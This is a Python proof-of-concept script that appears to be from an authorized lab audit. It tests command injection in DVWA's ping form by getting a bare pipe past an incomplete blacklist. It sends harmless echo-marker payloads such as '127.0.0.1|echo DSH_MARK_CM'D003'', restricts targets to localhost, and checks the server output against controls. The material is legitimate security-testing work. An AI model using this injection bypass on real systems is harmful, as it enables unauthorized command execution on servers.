#!/usr/bin/env python3
"""CMD-003 draft PoC: ping command injection via incomplete blacklist.

Local, authorized lab only. The script reads a session cookie (and optional
CSRF token) from local files supplied by the tester, posts the two parameter
names used by the audited code (Submit, ip) and looks for a harmless echo
marker inside the command-output region (<pre>). It never opens a reverse
connection, never reads or writes remote files, never downloads anything.

Bypass rationale (code lines 6-18): the blacklist removes the literal
substrings '||', '&', ';', '| ', '-', '$', '(', ')' and '`' in one
str_replace pass. '| ' includes a trailing space, so a *bare* pipe such as
"127.0.0.1|id" survives and reaches shell_exec('ping  -c 4 ' . $target).

Markers: the exact marker token is deliberately split in the request body
(shell quoting / cmd caret) so that a plain HTML reflection of the input
cannot produce the same token as a standalone output line.
"""

import argparse
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "DSH_MARK_CMD003"
# ';' is stripped by the blacklist -> this control must NOT produce the marker.
BLOCKED_CONTROL = "127.0.0.1;echo " + MARKER
BASELINE = "127.0.0.1"
PAYLOADS = {
    "linux": "127.0.0.1|echo DSH_MARK_CM'D003'",
    "windows": "127.0.0.1|echo DSH_MARK_CMD0^03",
}
ALLOWED_HOSTS = ("localhost", "127.0.0.1", "::1")

PRE_RE = re.compile(r"<pre\b[^>]*>(.*?)</pre>", re.IGNORECASE | re.DOTALL)
PING_RE = re.compile(r"(bytes from|reply from|time[=<]\s*\d|time=\d)", re.IGNORECASE)
STATS_RE = re.compile(r"(packets transmitted|packet loss|lost =|minimum =|min/avg)", re.IGNORECASE)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse to follow redirects: a login redirect is a precondition failure."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def validate_target(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("refusing non-http(s) scheme: %r" % (parts.scheme,))
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit("refusing non-local host %r (allowed: %s)" % (host, ", ".join(ALLOWED_HOSTS)))
    return url


def load_cookie(path):
    with open(path, "r", encoding="utf-8") as handle:
        value = handle.read().strip()
    if not value:
        raise SystemExit("cookie file %s is empty" % path)
    return value


def load_token(path):
    if not path:
        return {}
    with open(path, "r", encoding="utf-8") as handle:
        raw = handle.read().strip()
    if not raw:
        return {}
    if raw.startswith("{"):
        return {str(key): str(value) for key, value in json.loads(raw).items()}
    name, _, value = raw.partition("=")
    if not value:
        raise SystemExit("token file must be 'name=value' or a JSON object")
    return {name.strip(): value.strip()}


def build_opener():
    # NoRedirect must stay in front of the default handlers.
    return urllib.request.build_opener(NoRedirect)


def post(opener, url, fields, cookie, timeout):
    body = urllib.parse.urlencode(fields).encode("utf-8")
    request = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookie,
            "User-Agent": "dsh-lab-cmd003-poc/1.0",
        },
    )
    try:
        with opener.open(request, timeout=timeout) as response:
            return response.status, response.geturl(), response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, url, error.read().decode("utf-8", "replace")


def analyse(html):
    blocks = [match.group(1) for match in PRE_RE.finditer(html)]
    joined = "\n".join(blocks)
    lines = [line.strip() for line in joined.splitlines()]
    inside = sum(block.count(MARKER) for block in blocks)
    total = html.count(MARKER)
    return {
        "pre_blocks": len(blocks),
        "marker_total": total,
        "marker_inside_pre": inside,
        "marker_outside_pre": total - inside,
        "marker_standalone_line_in_pre": MARKER in lines,
        "ping_evidence_lines": sum(1 for line in lines if PING_RE.search(line)),
        "ping_summary_lines": [line for line in lines if STATS_RE.search(line)][:3],
    }


def run_case(opener, url, payload, cookie, token_fields, timeout):
    fields = dict(token_fields)
    fields["Submit"] = "Submit"
    fields["ip"] = payload
    status, final_url, html = post(opener, url, fields, cookie, timeout)
    result = {
        "payload": payload,
        "status": status,
        "final_url": final_url,
        "redirect_detected": final_url != url,
        "auth_wall_hint": status in (301, 302, 303, 307, 401, 403) or "login.php" in html.lower()[:4000],
        "csrf_hint": "csrf" in html.lower()[:4000] or "token" in html.lower()[:4000],
        "body_length": len(html),
    }
    result.update(analyse(html))
    return result


def main():
    parser = argparse.ArgumentParser(description="CMD-003 draft PoC (local lab only)")
    parser.add_argument("--url", default="http://127.0.0.1/dvwa/vulnerabilities/exec/",
                        help="full POST endpoint taken from the deployment, path must match the audited handler")
    parser.add_argument("--cookie-file", required=True, help="file containing the raw Cookie header value")
    parser.add_argument("--token-file", default=None, help="optional 'name=value' or JSON CSRF token file")
    parser.add_argument("--os", choices=sorted(PAYLOADS), default="linux", help="target OS branch to test")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    validate_target(args.url)
    cookie = load_cookie(args.cookie_file)
    token_fields = load_token(args.token_file)
    opener = build_opener()

    cases = {}
    try:
        cases["baseline"] = run_case(opener, args.url, BASELINE, cookie, token_fields, args.timeout)
        cases["blinded_control"] = run_case(opener, args.url, BLOCKED_CONTROL, cookie, token_fields, args.timeout)
        cases["bypass"] = run_case(opener, args.url, PAYLOADS[args.os], cookie, token_fields, args.timeout)
    except (urllib.error.URLError, OSError, TimeoutError) as error:
        print(json.dumps({"error": "transport", "detail": str(error)}, ensure_ascii=False, indent=2))
        return 4

    auth_wall = any(case["auth_wall_hint"] for case in cases.values())
    bypass = cases["bypass"]
    executed = (
        bypass["marker_standalone_line_in_pre"]
        and bypass.get("marker_inside_pre", 0) > 0
    )
    controls_clean = (
        cases["baseline"]["marker_total"] == 0
        and cases["blinded_control"]["marker_inside_pre"] == 0
        and cases["blinded_control"]["marker_standalone_line_in_pre"] is False
    )

    if auth_wall:
        interpretation = ("precondition failure: session rejected or redirected (login/token); "
                          "no conclusion about the command path")
        code = 3
    elif executed and controls_clean:
        interpretation = ("command execution observed: marker appears as a standalone line inside the "
                          "command-output <pre> while baseline and ';' control stay clean")
        code = 0
    elif executed and not controls_clean:
        interpretation = ("marker seen but controls are not clean (possible reflection or unexpected "
                          "input preservation); treat as inconclusive")
        code = 2
    else:
        interpretation = ("no marker observed: either the payload was filtered, shell_exec/ping is "
                          "unavailable, or the deployment differs from the audited fragment")
        code = 2

    summary = {
        "target": args.url,
        "os_branch": args.os,
        "marker": MARKER,
        "cases": cases,
        "observed": bool(executed and controls_clean and not auth_wall),
        "interpretation": interpretation,
    }
    print(json.dumps(summary, ensure_ascii=False, indent=2))
    return code


if __name__ == "__main__":
    sys.exit(main())
